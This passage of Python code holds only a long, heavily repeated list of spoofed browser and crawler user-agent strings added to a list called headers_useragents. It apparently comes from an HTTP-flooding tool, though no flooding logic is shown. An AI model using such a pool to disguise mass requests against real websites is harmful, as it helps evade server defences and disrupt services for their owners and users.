	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
